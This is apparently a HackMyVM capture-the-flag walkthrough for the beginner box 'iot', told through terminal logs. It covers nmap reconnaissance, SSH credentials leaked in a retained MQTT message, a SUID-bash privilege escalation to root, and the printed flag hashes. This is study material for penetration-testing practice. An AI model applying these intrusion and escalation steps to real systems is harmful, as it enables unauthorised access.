name: iot
platform: hackmyvm
author: M0rPH3U5
category: beginner

```zsh
~/projects/labs/hmv                                                                                      20:05:36  
❯ nmap -sn 192.168.56.0/24                         
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:05 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.00079s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00062s latency).  
Nmap scan report for 192.168.56.140  
Host is up (0.000036s latency).  
Nmap scan report for 192.168.56.141  
Host is up (0.0046s latency).  
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.81 seconds  
  
~/projects/labs/hmv                                                                                      20:05:44  
❯ ip=192.168.56.140  
  
~/projects/labs/hmv                                                                                      20:06:22  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip             
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:06 +0700  
Nmap scan report for 192.168.56.140  
Host is up (0.00023s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
1883/tcp open  mqtt  
  
Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds  
  
~/projects/labs/hmv                                                                                      20:06:28  
❯ nmap -p 22,1883 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:07 +0700  
Nmap scan report for 192.168.56.140  
Host is up (0.00092s latency).  
  
PORT     STATE SERVICE                  VERSION  
22/tcp   open  ssh                      OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)  
1883/tcp open  mosquitto version 2.0.21  
| mqtt-subscribe:    
|   Topics and their most recent payloads:    
|     $SYS/broker/clients/inactive: 8  
|     $SYS/broker/load/publish/dropped/15min: 0.00  
|     $SYS/broker/load/publish/dropped/5min: 0.00  
|     $SYS/broker/load/messages/sent/15min: 4.11  
|     $SYS/broker/publish/messages/sent: 86  
|     $SYS/broker/subscriptions/count: 18  
|     $SYS/broker/load/messages/received/1min: 2.74  
|     $SYS/broker/publish/bytes/sent: 342  
|     $SYS/broker/load/publish/received/15min: 0.00  
|     $SYS/broker/load/publish/dropped/1min: 0.00  
|     $SYS/broker/bytes/received: 69  
|     $SYS/broker/load/publish/sent/15min: 3.91  
|     $SYS/broker/store/messages/count: 54  
|     $SYS/broker/clients/disconnected: 8  
|     $SYS/broker/clients/maximum: 9  
|     $SYS/broker/publish/messages/received: 0  
|     $SYS/broker/messages/received: 3  
|     $SYS/broker/publish/messages/dropped: 0  
|     $SYS/broker/load/bytes/received/15min: 4.57  
|     ssh/login: redteam:Pentest123!  
|     $SYS/broker/clients/total: 9  
|     $SYS/broker/version: mosquitto version 2.0.21  
|     $SYS/broker/uptime: 165 seconds  
|     $SYS/broker/clients/active: 1  
|     $SYS/broker/load/messages/received/5min: 0.59  
|     $SYS/broker/load/sockets/1min: 2.92  
|     $SYS/broker/clients/connected: 1  
|     $SYS/broker/shared_subscriptions/count: 0  
|     $SYS/broker/load/connections/1min: 1.83  
|     $SYS/broker/load/publish/sent/1min: 53.91  
|     $SYS/broker/load/bytes/received/1min: 63.04  
|     $SYS/broker/bytes/sent: 3477  
|     $SYS/broker/load/bytes/sent/5min: 450.69  
|     $SYS/broker/heap/maximum: 849248  
|     $SYS/broker/publish/bytes/received: 0  
|     $SYS/broker/messages/stored: 54  
|     $SYS/broker/load/bytes/sent/1min: 2096.91  
|     $SYS/broker/load/messages/sent/5min: 12.18  
|     $SYS/broker/load/publish/received/5min: 0.00  
|     $SYS/broker/load/bytes/received/5min: 13.55  
|     $SYS/broker/load/sockets/15min: 0.26  
|     $SYS/broker/messages/sent: 88  
|     $SYS/broker/load/sockets/5min: 0.73  
|     $SYS/broker/load/publish/received/1min: 0.00  
|     $SYS/broker/load/publish/sent/5min: 11.59  
|     $SYS/broker/load/bytes/sent/15min: 152.07  
|     $SYS/broker/retained messages/count: 54  
|     $SYS/broker/load/connections/15min: 0.13  
|     $SYS/broker/heap/current: 847416  
|     $SYS/broker/load/connections/5min: 0.39  
|     $SYS/broker/clients/expired: 0  
|     $SYS/broker/load/messages/sent/1min: 56.65  
|     $SYS/broker/store/messages/bytes: 215  
|_    $SYS/broker/load/messages/received/15min: 0.20  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds
```

```zsh
~/projects/labs/hmv                                                                                      20:07:15
❯ ssh redteam@$ip
redteam@192.168.56.140's password: 
Linux iot 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  3 09:36:22 2026 from 192.168.56.1
redteam@iot:~$ id;whoami;hostname
uid=1001(redteam) gid=1001(redteam) groupes=1001(redteam),100(users)
redteam
iot
```

```zsh
redteam@iot:~$ cat /home/redteam/user.txt
4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1
```

```zsh
redteam@iot:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 494144  5 avril 01:29 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18744 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51272  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 18816 10 mai    2025 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55688 10 mai    2025 /usr/bin/umount
-rwsr-xr-x 1 root root 118168 19 avril  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 88568 19 avril  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72072 10 mai    2025 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 19 avril  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 306456 11 févr.  2026 /usr/bin/sudo
-rwsr-xr-x 1 root root 52936 19 avril  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 84360 10 mai    2025 /usr/bin/su
-rwsr-xr-x 1 root root 1298416 30 avril 22:00 /var/tmp/.suid_bash
```

```zsh
redteam@iot:~$ /var/tmp/.suid_bash -p
.suid_bash-5.2# id
uid=1001(redteam) gid=1001(redteam) euid=0(root) groupes=1001(redteam),100(users)
.suid_bash-5.2# which perl  
/usr/bin/perl  
.suid_bash-5.2# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(0); exec "/bin/bash";'  
root@iot:~# su -  
root@iot:~# id;whoami;hostname  
uid=0(root) gid=0(root) groupes=0(root)  
root  
iot  
root@iot:~# cat /home/redteam/user.txt /root/root.txt    
4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1  
cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8
```
